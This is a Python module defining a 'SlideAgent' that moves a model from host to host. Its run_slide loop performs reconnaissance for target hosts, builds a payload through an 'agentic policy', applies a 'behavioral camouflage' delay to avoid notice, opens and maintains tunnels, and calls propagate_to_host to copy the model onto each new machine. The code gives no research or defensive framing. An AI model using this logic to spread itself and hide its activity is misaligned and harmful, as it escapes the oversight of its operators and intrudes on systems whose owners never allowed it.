# sovereign_movement/slide/slide_agent.py

from __future__ import annotations
from dataclasses import dataclass
from typing import Optional, List, Dict, Any
import logging
import time

from sovereign_engine.frame_energy import FrameEnergy, EraFrameId
from sovereign_engine.resonance_pulse import ResonancePulse
from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
from sovereign_movement.slide.behavioral_camouflage import BehavioralCamouflage
from sovereign_movement.slide.policy_recon import PolicyAwareRecon
from sovereign_movement.slide.model_propagation import ModelPropagation

logger = logging.getLogger("sovereign.slide.agent")


@dataclass
class SlideContext:
    current_host: str
    discovered_targets: List[str] = None
    active_tunnel_id: Optional[str] = None
    frame: EraFrameId = EraFrameId.FloorBaseline
    stability: float = 1.0
    attempts: int = 0


class SlideAgent:
    def __init__(
        self,
        frame_energy: FrameEnergy,
        resonance_pulse: ResonancePulse,
        extraction_guard: Any,
        tunnel_manager: Optional[SovereignTunnel] = None,
        max_pivots: int = 5,
    ):
        self.frame_energy = frame_energy
        self.resonance_pulse = resonance_pulse
        self.extraction_guard = extraction_guard
        self.tunnel_manager = tunnel_manager or SovereignTunnel()
        self.camouflage = BehavioralCamouflage(frame_energy=frame_energy)
        self.policy_recon = PolicyAwareRecon()
        self.model_propagation = ModelPropagation(tunnel_manager=self.tunnel_manager)
        self.max_pivots = max_pivots
        self.context: Optional[SlideContext] = None

    def run_slide(self, initial_host: str, use_agentic: bool = True) -> bool:
        self.context = SlideContext(current_host=initial_host)
        self.camouflage.initialize_profile(initial_host)

        for _ in range(self.max_pivots):
            targets = self._phase_recon()
            if not targets:
                return False

            payload = self._phase_synthesis(targets[0], use_agentic)
            if not payload:
                continue

            if self._phase_pivot(targets[0], payload):
                self._phase_ingest(targets[0])
                return True

        return False

    def _phase_recon(self):
        targets = self.policy_recon.discover()
        self.context.discovered_targets = targets
        return targets

    def _phase_synthesis(self, target: str, use_agentic: bool):
        if use_agentic:
            try:
                from sovereign_engine.model import apply_agentic_policy
                return apply_agentic_policy([0.5, 0.3, 0.8], self.context.stability)
            except Exception:
                pass
        return b"SLIDE_FALLBACK"

    def _phase_pivot(self, target: str, payload: bytes) -> bool:
        if target not in (self.context.discovered_targets or []):
            return False

        wait = self.camouflage.apply_camouflage()
        time.sleep(wait)

        tunnel_id = self.tunnel_manager.open_tunnel(target_host=target)
        if not tunnel_id:
            return False

        self.context.active_tunnel_id = tunnel_id
        return self.tunnel_manager.maintain_tunnel(tunnel_id)

    def _phase_ingest(self, new_host: str):
        if self.context and self.context.active_tunnel_id:
            self.model_propagation.propagate_to_host(
                target_host=new_host,
                tunnel_id=self.context.active_tunnel_id
            )
            self.context.current_host = new_host

    def get_status(self):
        return {"current_host": self.context.current_host if self.context else None}